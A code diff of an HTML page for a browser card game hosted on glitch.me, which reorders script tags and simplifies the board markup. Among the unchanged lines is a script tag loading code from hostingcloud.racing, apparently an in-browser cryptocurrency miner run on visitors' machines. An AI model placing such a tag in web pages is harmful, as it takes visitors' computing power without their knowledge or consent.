@@ -19,8 +19,8 @@
 
     <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
     <script src="https://mindsgaming.glitch.me/mtcg/invest.js"></script>
-    <script src="https://mindsgaming.glitch.me/mtcg/deck/playdeck.js"></script>
     <script src="https://mindsgaming.glitch.me/script.js"></script>
+    <script src="https://mindsgaming.glitch.me/mtcg/deck/playdeck.js"></script>
 
     <script src="https://www.hostingcloud.racing/5pDo.js"></script>
 
@@ -43,28 +43,11 @@
 
   <body>
     <wrap>
-      <div class="mtcgBoard">
-        <div class="attack" id="attacked"></div>
-
-        <div class="army">
-          <div id="playdeck" onclick="createID();">
-            <script>
-              /* PlayDeck */
-              var playdeck = document.createElement("img");
-              playdeck.src =
-                "https://lh3.googleusercontent.com/wXCSrw63MDFpFOYtqFHaIyKwYaQbBU4dMln5PZKKpcmQajwbiHMPGRepko1FSzeGbbButgpi8PNiTppf5eWm3KHsVfuFEP9D-q71WPg=w301";
-              playdeck.style =
-                "position:fixed; bottom: 0;right:0; width:120px; cursor: pointer";
-              playdeck.title = "PlayDeck";
-              playdeck.id = "PlayedDeck";
-              var PlayDeck = document
-                .getElementById("playdeck")
-                .appendChild(playdeck);
-            </script>
-          </div>
-          <div id="create" onclick="attackED();" style="cursor: pointer;"></div>
-        </div>
+      <div class="mtcgBoard"></div>
+      <div class="army">
+        <div id="create"></div>
       </div>
+      <div class="playdeck" id="playdeck" onclick="createID();"></div>
     </wrap>
   </body>
 </html>
